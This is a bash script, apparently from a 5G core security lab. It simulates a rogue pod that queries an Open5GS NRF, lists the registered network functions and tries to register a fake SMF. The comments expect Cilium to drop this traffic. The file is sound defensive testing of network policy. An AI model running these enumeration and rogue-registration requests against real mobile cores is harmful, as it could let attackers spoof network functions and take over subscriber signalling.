#!/bin/bash
# a2-nrf-desde-impostor.sh — A2 desde dentro: un pod impostor en 5g-cp.
#
# Mismo ataque que a2-nrf-desde-la-ran.sh, pero desde un pod que ya está en el
# namespace del core (p. ej. una imagen alterada en la cadena de suministro).
# No lleva las etiquetas de ninguna NF, así que Cilium no le da su identidad.
#
# Esperado: DROPPED en Hubble. El namespace no basta para hablar con el NRF:
# hace falta la identidad de una NF. Y que nadie pueda copiar esa identidad lo
# decide la admisión (k8s/admission/kyverno-identidad-nf.yaml).
#
# Uso (desde node-master):
#   kubectl apply -f attacks/nf-impostor.yaml
#   bash attacks/a2-nrf-desde-impostor.sh
set -uo pipefail
NS=5g-cp
POD=nf-impostor
NRF="http://open5gs-cp-nrf-sbi.5g-cp.svc.cluster.local:7777/nnrf-nfm/v1/nf-instances"
FALSO=ffffffff-dead-beef-cafe-000000000099

echo "=== A2 (impostor): NRF desde ${NS}/${POD} | $(date -u) ==="
kubectl -n "$NS" wait --for=condition=Ready "pod/${POD}" --timeout=120s >/dev/null

pedir() {
  local desc="$1"; shift
  printf '%-34s ' "$desc"
  kubectl -n "$NS" exec "$POD" -- curl -s --max-time 5 --http2-prior-knowledge \
    -o /dev/null -w "HTTP %{http_code}\n" "$@" || echo "sin respuesta"
}

pedir "READ  (listar NF)" "$NRF"
pedir "CREATE (SMF falso)" -X PUT "${NRF}/${FALSO}" -H 'Content-Type: application/json' \
  -d "{\"nfInstanceId\":\"${FALSO}\",\"nfType\":\"SMF\",\"nfStatus\":\"REGISTERED\",\"ipv4Addresses\":[\"10.42.99.99\"]}"
